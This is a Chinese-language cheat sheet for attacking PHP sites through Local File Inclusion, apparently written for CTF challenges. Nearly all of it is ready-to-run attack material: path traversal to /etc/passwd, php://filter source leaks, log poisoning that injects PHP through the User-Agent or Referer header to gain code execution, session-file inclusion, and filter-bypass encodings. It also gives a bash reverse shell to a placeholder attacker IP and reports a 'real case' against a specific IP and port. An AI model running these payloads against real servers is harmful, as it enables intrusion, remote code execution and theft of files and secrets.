# LFI (Local File Inclusion) 攻击清单

## 快速诊断

```bash
# 1. 确认 LFI 存在
curl -s "http://TARGET/?file=../../../../etc/passwd"
# 成功 → 读到 /etc/passwd 内容

# 2. 检测过滤器
curl -s "http://TARGET/?file=php://filter/convert.base64-encode/resource=index.php"
# 返回 "error！" 或类似 → 有协议过滤
```

## Flag 常见位置（优先级排序）

```bash
# 环境变量（CTF 靶机最常见！）
/proc/self/environ          # 含 FLAG=flag{...}

# 标准位置
/flag
/flag.txt
/root/flag
/root/flag.txt
/home/*/flag
/home/*/flag.txt
/var/www/flag
/var/www/html/flag
/app/flag

# 源码泄露
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../flag.php
```

## 协议过滤绕过技巧

当 `php://`, `data://`, `file://`, `phar://` 被过滤时：

### 方法1：日志投毒（Log Poisoning）→ RCE

```bash
# Step 1: 注入 PHP 代码到日志
curl -s -A "<?php system('env'); ?>" "http://TARGET/"
# 或注入 Referer 头
curl -s -e "<?php system('cat /flag'); ?>" "http://TARGET/"

# Step 2: 包含日志文件执行命令
curl -s "http://TARGET/?file=/var/log/apache2/access.log"
# 日志文件位置：
#   /var/log/apache2/access.log   (Debian/Ubuntu Apache)
#   /var/log/httpd/access_log     (CentOS/RHEL Apache)
#   /var/log/nginx/access.log     (Nginx)
#   /proc/self/fd/N               (文件描述符，N=10-20尝试)
```

**实战案例** (120.255.34.10:28915)：
- 过滤了 `php://`, `data://`, `file://`, `phar://`, `tp`
- 通过 User-Agent 注入 `<?php system('env'); ?>`
- 包含 `/var/log/apache2/access.log`
- 环境变量中发现 `FLAG=flag{1jr7jomet0bf313i384ib8q6ua4gr2a5}`

### 方法2：/proc/self/ 系列

```bash
/proc/self/environ        # 环境变量（可能含 FLAG）
/proc/self/cmdline        # 启动命令
/proc/self/fd/N           # 文件描述符（遍历 0-50）
/proc/self/root/          # 根目录符号链接
```

### 方法3：Session 文件包含

```bash
# 先设置 session：访问 ?file=<?php system('cat /flag');?>
# 然后包含 session 文件
/tmp/sess_<PHPSESSID>
/var/lib/php/sessions/sess_<PHPSESSID>
```

### 方法4：PHP 封装器变体（大小写/编码）

```bash
# stripos 大小写不敏感时无效，但可尝试：
Php://filter                # 如果用 strpos 而非 stripos
pHp://filter                # 混合大小写

# URL 编码
php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php

# 双写
pphphp://filter             # 如果过滤后替换为空

# 通配符
/php://filter               # 前缀绕过
```

## 命令执行速查（注入到日志后）

```bash
# 查找 flag
system('find / -name flag* -type f 2>/dev/null')
system('env | grep -i flag')
system('cat /flag')
system('ls -la /root/')

# 反弹 shell（如果需要）
system('bash -c "bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1"')
```

## 调试技巧

```bash
# 确认日志是否可写
curl -s -A "<?php phpinfo(); ?>" "http://TARGET/"
curl -s "http://TARGET/?file=/var/log/apache2/access.log"
# 如果看到 phpinfo 输出 → 日志包含成功

# 确认当前工作目录
curl -s -A "<?php system('pwd'); ?>" "http://TARGET/"

# 列出 web 目录
curl -s -A "<?php system('ls -la'); ?>" "http://TARGET/"
```
